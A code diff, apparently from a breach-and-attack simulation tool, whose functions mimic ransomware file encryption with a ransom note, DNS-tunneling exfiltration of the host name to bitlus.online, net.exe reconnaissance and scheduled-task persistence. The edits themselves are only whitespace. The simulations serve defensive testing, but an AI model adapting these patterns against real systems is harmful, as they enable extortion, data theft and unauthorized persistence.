@@ -355,7 +355,6 @@ def ransomware_simulation():
             print(f"Created directory: {test_directory}")
         else:
             print(f"Directory already exists: {test_directory}")
-
         # Step 2: Create test files
         for i in range(file_count):
             file_name = f"{file_prefix}{i}{file_extension}"
@@ -363,20 +362,16 @@ def ransomware_simulation():
             with open(file_path, "w") as file:
                 file.write(f"This is a test file number {i}.\n")
         print(f"Created {file_count} test files.")
-
         # Step 3: Encrypt test files, and only the test files
         for i in range(file_count):
             file_name = f"{file_prefix}{i}{file_extension}"
-            file_path = os.path.join(test_directory, file_name)
-            
+            file_path = os.path.join(test_directory, file_name)        
             with open(file_path, "rb") as file:
-                file_data = file.read()
-            
+                file_data = file.read()       
             encrypted_data = cipher_suite.encrypt(file_data)
             with open(file_path, "wb") as file:
                 file.write(encrypted_data)
         print(f"Encrypted {file_count} test files.")
-
         # Step 4: Create a ransom note
         ransom_note_path = os.path.join(test_directory, "README_RECOVER.txt")
         with open(ransom_note_path, "w") as ransom_note:
@@ -387,34 +382,27 @@ def ransomware_simulation():
         print("Ransom note created.")
         logging_func("ransomware simulation completed")
         return {"use_case": "ransomware_simulation", "status": "completed"}
-
     except Exception as e:
         print(f"Error during ransomware simulation: {e}")
         logging_func("ransomware simulation error")
         return {"use_case": "ransomware_simulation", "status": f"error: {e}"}
-
 
 def dns_tunneling():
     logging_func("DNS tunneling simulation starting")
     DNS_TUNNEL_API = f"{base_url}/api/dnstunneling"
     try:
         print("Executing DNS Tunneling Use-Case")
-
         # Example data to send
-        data_to_send = f"{socket.gethostname()}-test-data"
-        
+        data_to_send = f"{socket.gethostname()}-test-data"     
         # Encode data to Base64 (URL-safe)
         encoded_data = base64.urlsafe_b64encode(data_to_send.encode('utf-8')).decode('utf-8')
         print(f"Encoded Data (Base64): {encoded_data}")
-
         # Simulate a DNS query by sending the encoded data as a subdomain
         headers = {
             "Host": f"{encoded_data}.bitlus.online",  # Format as subdomain
         }
-        
         # Send the request to the API
         response = requests.get(DNS_TUNNEL_API, headers=headers)
-        
         # Handle the API response
         if response.status_code == 200:
             response_data = response.json()
@@ -430,7 +418,6 @@ def dns_tunneling():
         logging_func("DNS Tunneling Error")
         return {"use_case": "dns_tunneling", "status": f"error{e}"}
  
-
 def net_recon():
     CMD = ['group', 'user', 'localgroup', 'user /domain']
     print("NET.exe recon imitation starting")
@@ -500,34 +487,28 @@ def scheduled_tasks():
             "/TN", task_name,
             "/TR", "C:\\Windows\\System32\\notepad.exe",  # Program to run
             "/ST", datetime.now().strftime("%H:%M:%S"),  # Current time
-            "/F"  # Force overwrite if it's already there
+            "/F"  # Force overwrite if its already there
         ]
-
         # Create the scheduled task
         create_result = subprocess.run(create_command, capture_output=True, text=True)
-
         # Check if the creation command was successful
         if create_result.returncode == 0:
             print(f"Scheduled task '{task_name}' created successfully.")
         else:
             print(f"Failed to create scheduled task. Error: {create_result.stderr}")
             return {"use_case": "scheduled_tasks", "status": f"error: {create_result.stderr}"}
-
         # Run the task immediately
         run_command = ["schtasks", "/Run", "/TN", task_name]
         run_result = subprocess.run(run_command, capture_output=True, text=True)
-
         # Check if the run command was successful
         if run_result.returncode == 0:
             print(f"Scheduled task '{task_name}' executed successfully.")
         else:
             print(f"Failed to execute scheduled task. Error: {run_result.stderr}")
             return {"use_case": "scheduled_tasks", "status": f"error: {run_result.stderr}"}
-
     except Exception as e:
         print(f"An error occurred: {e}")
         return {"use_case": "scheduled_tasks", "status": f"error: {e}"}
-
     return {"use_case": "scheduled_tasks", "status": "completed"}
 
 def encrypted_traffic():
